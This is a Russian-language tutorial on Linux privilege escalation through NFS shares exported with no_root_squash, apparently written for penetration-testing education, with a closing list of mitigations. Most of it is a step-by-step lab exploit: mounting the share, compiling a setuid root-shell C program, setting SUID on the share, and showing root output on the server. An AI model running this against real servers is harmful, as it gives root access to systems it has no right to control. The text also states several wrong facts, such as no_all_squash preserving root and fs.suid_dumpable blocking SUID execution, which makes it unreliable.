# NFS no_root_squash как вектор повышения привилегий на Linux

## Контекст и базовые понятия

NFS (Network File System) — протокол распределенных файловых систем, позволяющий клиентам монтировать удаленные каталоги сервера как локальные файловые системы. В архитектуре NFS критическим элементом безопасности является механизм маппинга идентификаторов пользователей (UID/GID) между клиентом и сервером. По умолчанию NFS реализует политику `root_squash`, при которой запросы от пользователя с UID 0 (root) на клиенте транслируются сервером в UID `nobody` (обычно 65534 или 60000+ в зависимости от дистрибутива). Это предотвращает выполнение действий с правами root на сервере, даже если атакующий имеет root-доступ на клиенте.

Опция `no_root_squash` отключает этот механизм маппинга. При её наличии UID 0 на клиенте сохраняется как UID 0 на сервере. Это создает вектор повышения привилегий (Privilege Escalation) для атакующего, имеющего доступ к клиентской машине (или способного выполнить на ней код от имени root), но не имеющего прав на сервере.

В контексте тестирования на проникновение важно разграничивать два сценария:
1.  **Удаленная эксплуатация (Remote Exploit):** Атакующий имеет доступ к клиенту (например, через SSH) и может выполнять команды от имени root на клиенте. Он монтирует экспортированную директорию сервера и пишет на нее файлы.
2.  **Локальная эксплуатация (Local Exploit):** Атакующий имеет доступ к серверу NFS (или к клиенту, который уже смонтировал шару), но ограничен низкими привилегиями. Если на сервере настроен `no_all_squash` или `no_root_squash` для определенных UID, атакующий может создать SUID-бинарник, который будет выполняться с правами root на сервере.

Ключевое разграничение между режимами маппинга представлено в таблице ниже.

| Параметр экспорта NFS | Поведение при UID 0 (root) на клиенте | Поведение при UID > 0 (обычный пользователь) на клиенте | Безопасность |
|---|---|---|---|
| `root_squash` (по умолчанию) | UID 0 маппируется в `nobody` (UID 65534). Права root на сервере **отсутствуют**. | UID/GID передаются без изменений. | Высокая (стандартная) |
| `no_root_squash` | UID 0 **сохраняется** как UID 0 на сервере. Права root на сервере **есть**. | UID/GID передаются без изменений. | Критическая уязвимость |
| `all_squash` | Все UID маппируются в `nobody`. | Все UID маппируются в `nobody`. | Высокая (для общих шар), но ограничивает функциональность |
| `no_all_squash` | UID 0 сохраняется как UID 0. | UID/GID передаются без изменений. | Зависит от контекста; аналогично `no_root_squash` для root |

Путаница часто возникает между `no_root_squash` и `no_all_squash`. `no_all_squash` является противоположностью `all_squash` и по умолчанию включен в большинстве реализаций NFS (вместе с `root_squash`). Однако в конфигурациях экспорта часто явно указывают `no_root_squash` для удобства администрирования (например, для резервного копирования), что и создает уязвимость.

## Внутреннее устройство механизма маппинга и эксплуатации

Механизм повышения привилегий через NFS базируется на двух компонентах: неправильной конфигурации сервера (`/etc/exports`) и использовании SUID-битов (Set User ID) на файлах.

### 1. Конфигурация сервера NFS

Сервер NFS использует файл `/etc/exports` для определения правил экспорта. Синтаксис строки экспорта:
`<путь> <клиент>(<опции>)`

Опция `no_root_squash` может применяться глобально или для конкретного экспорта. Если она указана для экспорта, сервер доверяет UID 0 клиента.

```text
# Иллюстративная схема структуры /etc/exports
/var/nfs/general  192.168.1.0/24(rw,sync,no_root_squash,no_subtree_check)
/home/ubuntu      192.168.1.10(rw,sync,root_squash)
```

В данном примере первый экспорт уязвим, второй — нет. Опция `no_subtree_check` отключает проверку дерева каталогов, что часто используется вместе с `no_root_squash` для повышения производительности, но не влияет напрямую на маппинг UID.

### 2. Механизм SUID-бита

SUID (Set User ID) — это бит разрешения в POSIX-файловой системе. Если установлен для исполняемого файла, процесс, запущенный этим файлом, получает эффективный UID (EUID) владельца файла, а не UID запускающего пользователя.

```text
# Пример прав SUID-файла
-rwsr-xr-x 1 root root 12345 Jan 1 12:00 /usr/bin/sudo
```

Здесь `s` в позиции владельца (`rws`) указывает на SUID. Если обычный пользователь выполнит `/usr/bin/sudo`, процесс `sudo` будет иметь EUID 0.

### 3. Вектор атаки

Атакующий использует `no_root_squash` для обхода ограничений записи на сервере.
1.  На клиенте (где атакующий имеет root) монтируется уязвимый шар сервера.
2.  Атакующий создает исполняемый файл (например, копию `/bin/bash` или скомпилированный C-код) в смонтированной директории.
3.  Поскольку клиент маппируется как root на сервере, атакующий может изменить владельца файла на `root` и установить SUID-бит.
4.  На сервере (или другом клиенте) обычный пользователь выполняет этот файл. Процесс получает EUID 0, что дает root-доступ на сервере.

Сравнительная таблица вариантов эксплуатации:

| Метод | Требования к атакующему | Артефакт | Результат |
|---|---|---|---|
| **Копирование SUID-бинарника** | Root на клиенте, доступ к NFS | Файл с SUID-битом, владельцем root | Root на сервере при выполнении |
| **Копирование `/bin/bash`** | Root на клиенте, доступ к NFS | `/bin/bash` с SUID-битом | Интерактивная root-shell на сервере |
| **Загрузка shell-кода** | Root на клиенте, доступ к NFS | Скомпилированный C-эксплойт | Root на сервере |
| **Использование `LD_PRELOAD`** | Root на клиенте, доступ к NFS | Библиотека `ld_nfs.so` | Обход маппинга UID (для сложных случаев) |

## Применение и работа с предметом

На практике работа с NFS-уязвимостями включает этапы обнаружения, подготовки эксплойта и эксплуатации.

### Обнаружение уязвимых шар

С серверной стороны уязвимость видна в `/etc/exports`. С клиентской стороны (извне) используется утилита `showmount`.

```bash
# Команда для просмотра экспортированных директорий
showmount -e <IP_сервера>
```

Вывод покажет список шар. Наличие `no_root_squash` в конфигурации сервера не видно извне, но если шар доступен для записи (`rw`), атакующий может проверить возможность создания файлов от имени root, смонтировав шар локально.

### Подготовка и компиляция эксплойта

Стандартный подход — создание простого C-программы, которая устанавливает UID/GID в 0 и запускает шелл.

```c
// Фрагмент кода эксплойта (pwn.c)
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
```

Компиляция должна выполняться от имени root на клиенте, чтобы скомпилированный бинарник изначально принадлежал root, или же владелец будет изменен позже.

```bash
# Компиляция на клиенте
gcc pwn.c -o pwn
```

### Эксплуатация: Монтирование и модификация

Ключевой шаг — монтирование NFS-шары на клиенте.

```bash
# Монтирование уязвимой шары
sudo mount -t nfs <IP_сервера>:/путь/к/экспорту /mnt
```

После монтирования файловая система `/mnt` на клиенте является прямой ссылкой на сервер. Операции записи на `/mnt` выполняются от имени root клиента, который маппируется в root сервера.

```bash
# Копирование эксплойта на шару
cp pwn /mnt/

# Установка прав SUID и владельца root
# Важно: chmod u+s устанавливает SUID-бит
chmod u+s /mnt/pwn
chown root:root /mnt/pwn
```

Проверка прав на сервере (через SSH или другой клиент) подтвердит успешность настройки:

```bash
# Проверка на сервере
ls -la /путь/к/экспорту/pwn
# Ожидаемый вывод: -rwsr-xr-x 1 root root ...
```

### Выполнение и получение доступа

На сервере (или любом другом клиенте, имеющем доступ к этой шаре) обычный пользователь выполняет файл.

```bash
# Выполнение на сервере от имени обычного пользователя
./pwn
# Вывод: id
# uid=0(root) gid=0(root) ...
```

Типичные ошибки при эксплуатации:
1.  **Несовместимость архитектур:** Копирование бинарника с x86_64 на ARM-сервер приведет к ошибке выполнения. Необходимо компилировать под целевую архитектуру.
2.  **Защита SUID:** Некоторые системы используют `fs.suid_dumpable=0` или другие механизмы, блокирующие выполнение SUID-файлов из NFS-монтирований в целях безопасности (NFSv4 имеет более строгие проверки, чем NFSv3).
3.  **Кэширование UID:** В некоторых старых реализациях NFS требуется перемонтирование или перезапуск служб для обновления маппинга прав.

## Сквозной практический пример: Повышение привилегий через NFS no_root_squash

**Исходные условия:**
*   **Среда:** Локальная лаборатория.
*   **Цель (Server):** Linux-машина с IP `192.168.56.101`, настроенным NFS-сервером. В `/etc/exports` экспортируется `/tmp` с опцией `no_root_squash`.
*   **Атакующий (Client):** Linux-машина с IP `192.168.56.102`. Имеет доступ к серверу по SSH с учетной записью `user` (низкие привилегии), но может выполнить команду `sudo` от имени `user` без пароля (или имеет root на клиенте).
*   **Цель атаки:** Получение root-доступа на сервере `192.168.56.101`.

### Шаг 1: Подтверждение уязвимости и монтирование

Атакующий проверяет доступность NFS-шары и монтирует её локально.

```bash
# На клиенте (192.168.56.102)
# 1. Проверка экспортов
showmount -e 192.168.56.101
# Вывод: Export list for 192.168.56.101:
# /tmp *

# 2. Создание точки монтирования и монтирование
sudo mkdir /mnt/nfs_share
sudo mount -t nfs 192.168.56.101:/tmp /mnt/nfs_share

# 3. Проверка прав (должно быть rw)
touch /mnt/nfs_share/test_file
ls -la /mnt/nfs_share/test_file
# Вывод: -rw-r--r-- 1 root root ...
# Важно: Владелец root, так как клиент маппируется как root на сервере
```

### Шаг 2: Подготовка и загрузка эксплойта

Атакующий создает простой C-код для получения root-shell, компилирует его и копирует на шару.

```bash
# На клиенте (192.168.56.102)
# 1. Создание исходного кода
cat > /tmp/pwn.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
EOF

# 2. Компиляция (обязательно от root, чтобы бинарник был скомпилирован корректно)
sudo gcc /tmp/pwn.c -o /tmp/pwn

# 3. Копирование на смонтированную шару
cp /tmp/pwn /mnt/nfs_share/

# 4. Установка прав SUID и владельца root
# Поскольку мы root на клиенте и шара маппируется как root на сервере,
# эти операции применятся к файлу на сервере как root
sudo chown root:root /mnt/nfs_share/pwn
sudo chmod u+s /mnt/nfs_share/pwn
```

### Шаг 3: Верификация на сервере

Переходим на сервер (или используем другой клиент) для проверки прав файла.

```bash
# На сервере (192.168.56.101) или через SSH
ls -la /tmp/pwn
# Ожидаемый вывод:
# -rwsr-xr-x 1 root root 16784 Oct 27 10:00 /tmp/pwn
# ^
# SUID-бит установлен (s в позиции владельца)
```

### Шаг 4: Выполнение и получение root-shell

Атакующий выполняет файл от имени обычного пользователя на сервере.

```bash
# На сервере (192.168.56.101) от имени обычного пользователя
cd /tmp
./pwn

# Вывод:
# id
# uid=0(root) gid=0(root) groups=0(root)
# hostname
# target-server
```

**Ожидаемый вывод:**
Пример демонстрирует успешное повышение привилегий. Атакующий, имея доступ к клиенту с root-правами (или возможностью выполнения команд от root), использовал уязвимость `no_root_squash` для записи SUID-файла на сервер. Выполнение этого файла от имени обычного пользователя на сервере дало атакующему root-доступ.

## Аналитический вывод

Уязвимость NFS `no_root_squash` представляет собой классический пример риска, связанного с доверием к идентификаторам пользователей в распределенных системах. Ключевой фактор успеха атаки — не сама возможность монтирования NFS, а маппинг UID 0 клиента в UID 0 сервера. Это позволяет обойти стандартные механизмы DAC (Discretionary Access Control) на сервере.

Для предотвращения эксплуатации необходимо:
1.  Отключить `no_root_squash` в `/etc/exports` или использовать `root_squash` явно.
2.  Ограничить доступ к NFS-шарам по IP-адресам, а не использовать `*`.
3.  Использовать NFSv4 с Kerberos-аутентификацией, где маппинг UID/GID может быть более строгим.
4.  Мониторить появление новых SUID-файлов в экспортируемых директориях.

В современных условиях, с развитием контейнеризации и микросервисов, NFS используется реже, но в legacy-инфраструктурах и корпоративных сетях для общих хранилищ эта уязвимость остается актуальной. Атакующий может использовать её как часть цепочки эскалации привилегий, переходя от клиентской машины к серверной.
